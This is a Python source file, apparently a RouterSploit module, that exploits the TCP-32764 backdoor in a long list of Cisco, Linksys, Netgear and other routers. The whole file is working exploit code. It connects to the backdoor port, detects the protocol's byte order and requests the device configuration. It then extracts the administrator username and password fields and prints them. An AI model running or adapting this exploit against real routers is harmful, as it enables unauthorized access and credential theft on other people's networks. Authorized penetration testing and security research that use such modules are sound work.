import socket
import struct
import re

from routersploit import (
    exploits,
    print_error,
    print_success,
    print_table,
    random_text,
    mute,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for backdoor functionality.
    If the target is vulnerable it allows to fetch credentials for administrator user.
    """
    __info__ = {
        'name': 'TCP-32764 Info Disclosure',
        'description': 'Exploits backdoor functionality that allows fetching credentials for administrator user.',
        'authors': [
            'Eloi Vanderbeken',  # vulnerability discovery & proof of concept exploit
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://github.com/elvanderb/TCP-32764',
        ],
        'devices': [
            'Cisco RVS4000 fwv 2.0.3.2 & 1.3.0.5',
            'Cisco WAP4410N',
            'Cisco WRVS4400N',
            'Cisco WRVS4400N',
            'Diamond DSL642WLG / SerComm IP806Gx v2 TI',
            'LevelOne WBR3460B',
            'Linksys RVS4000 Firmware V1.3.3.5',
            'Linksys WAG120N',
            'Linksys WAG160n v1 and v2',
            'Linksys WAG200G',
            'Linksys WAG320N',
            'Linksys WAG54G2',
            'Linksys WAG54GS',
            'Linksys WRT350N v2 fw 2.00.19',
            'Linksys WRT300N fw 2.00.17',
            'Netgear DG834',
            'Netgear DGN1000',
            'Netgear DGN2000B',
            'Netgear DGN3500',
            'Netgear DGND3300',
            'Netgear DGND3300Bv2 fwv 2.1.00.53_1.00.53GR',
            'Netgear DM111Pv2',
            'Netgear JNR3210',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1')  # target address
    endianness = "<"

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((self.target, 32764))

            conf = self.execute(s, 1)
            lines = re.split("\x00|\x01", conf)
            pattern = re.compile('user(name)?|password|login')

            credentials = []

            for line in lines:
                try:
                    (var, value) = line.split("=")
                    if len(value) > 0 and pattern.search(var):
                        credentials.append((var, value))
                except ValueError:
                    pass

            if len(credentials):
                print_table(("Parameter", "Value"), *credentials)
        else:
            print_error("Target is not vulnerable")

    def execute(self, s, message, payload=""):
        header = struct.pack(self.endianness + 'III', 0x53634D4D, message, len(payload) + 1)
        s.send(header + payload + "\x00")
        r = s.recv(0xC)

        while len(r) < 0xC:
            tmp = s.recv(0xC - len(r))
            r += tmp

        sig, ret_val, ret_len = struct.unpack(self.endianness + 'III', r)

        if ret_val != 0:
            return ""

        ret_str = ""
        while len(ret_str) < ret_len:
            tmp = s.recv(ret_len - len(ret_str))
            ret_str += tmp

        return ret_str

    @mute
    def check(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)

        try:
            s.connect((self.target, 32764))
        except socket.error:
            return False  # target is not vulnerable

        s.send(random_text(12))
        r = s.recv(0xC)

        while len(r) < 0xC:
            tmp = s.recv(0xC - len(r))
            r += tmp

        sig, ret_val, ret_len = struct.unpack('<III', r)

        if sig == 0x53634D4D:
            self.endianness = "<"
        elif sig == 0x4D4D6353:
            self.endianness = ">"
        s.close()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((self.target, 32764))

        conf = self.execute(s, 1)
        s.close()

        lines = re.split("\x00|\x01", conf)

        if len(lines):
            return True  # target is vulnerable

        return False  # target is not vulnerable
